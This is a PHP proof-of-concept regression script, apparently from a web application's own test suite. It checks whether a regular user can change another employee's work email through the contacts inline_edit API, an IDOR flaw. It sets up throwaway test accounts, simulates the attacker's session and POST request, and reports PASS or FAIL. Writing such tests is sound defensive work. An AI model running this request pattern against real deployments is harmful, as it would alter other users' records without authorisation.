<?php
// CSRF: itm_validate_csrf_token()
/**
 * Repro script for IDOR in modules/contacts/api/inline_edit.php
 */
define('ITM_CLI_SCRIPT', true);
require_once __DIR__ . '/../config/config.php';
require_once __DIR__ . '/lib/script_cli_output.php';
itm_script_output_begin('PoC: Contacts IDOR');

$nl = itm_script_output_nl();

require_once __DIR__ . '/lib/itm_script_test_employee.php';

$company_id = 1;

// 1. Create Attacker (non-admin)
$attacker = itm_script_test_employee_create($conn, $company_id, [
    'script_slug' => 'repro-idor-attacker',
    'role_id' => 2, // Regular User
]);
if (!$attacker) die("Failed to create attacker");
itm_script_test_employee_register_teardown($conn, (int)$attacker['id']);

// 2. Create Victim
$victim = itm_script_test_employee_create($conn, $company_id, [
    'script_slug' => 'repro-idor-victim',
    'role_id' => 2,
]);
if (!$victim) die("Failed to create victim");
itm_script_test_employee_register_teardown($conn, (int)$victim['id']);

echo "Attacker ID: " . $attacker['id'] . "\n";
echo "Victim ID: " . $victim['id'] . "\n";
echo "Victim Email before attack: " . $victim['email'] . "\n";

// 3. Simulate Attacker Session
$_SESSION['employee_id'] = (int)$attacker['id'];
$_SESSION['company_id'] = $company_id;
$_SESSION['username'] = $attacker['username'];
$_SESSION['csrf_token'] = 'test_token';

// 4. Perform Attack
$_POST['type'] = 'emp';
$_POST['id'] = $victim['id'];
$_POST['field'] = 'work_email';
$_POST['value'] = 'pwned@example.com';
$_POST['csrf_token'] = 'test_token';

// Call the vulnerable endpoint
$old_cwd = getcwd();
chdir(__DIR__ . '/../modules/contacts/api');
ob_start();
include 'inline_edit.php';
$output = ob_get_clean();
chdir($old_cwd);

echo "API Output: " . $output . "\n";

// 5. Verify
$res = mysqli_query($conn, "SELECT work_email FROM employees WHERE id = " . (int)$victim['id']);
$row = mysqli_fetch_assoc($res);

if ($row['work_email'] === 'pwned@example.com') {
    echo colorText("[FAIL] IDOR Vulnerability confirmed: Victim's email was updated by another user.", 'fail') . "\n";
} else {
    echo colorText("[PASS] IDOR Vulnerability not found or blocked.", 'pass') . "\n";
}

itm_script_output_end();
